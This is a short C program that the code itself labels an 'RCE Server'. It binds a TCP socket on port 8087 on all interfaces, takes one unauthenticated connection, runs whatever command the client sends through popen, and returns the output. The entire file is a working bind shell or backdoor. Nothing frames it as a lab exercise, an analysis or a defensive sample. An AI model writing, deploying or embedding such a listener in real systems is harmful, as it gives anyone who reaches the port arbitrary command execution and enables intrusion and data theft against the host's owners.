#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 8087

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char cmd[256] = {0}, output[4096] = {0};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    bind(server_fd, (struct sockaddr *)&address, addrlen);
    listen(server_fd, 3);
    printf("RCE Server listening on port %d...\n", PORT);

    client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    read(client_fd, cmd, sizeof(cmd));
    printf("Executing command: %s\n", cmd);

    FILE *fp = popen(cmd, "r");
    if (fp != NULL) {
        int total = 0, n;
        while ((n = fread(output + total, 1, sizeof(output) - total - 1, fp)) > 0) {
            total += n;
        }
        output[total] = '\0';
        pclose(fp);
    }

    send(client_fd, output, strlen(output), 0);
    close(client_fd);
    close(server_fd);
    return 0;
}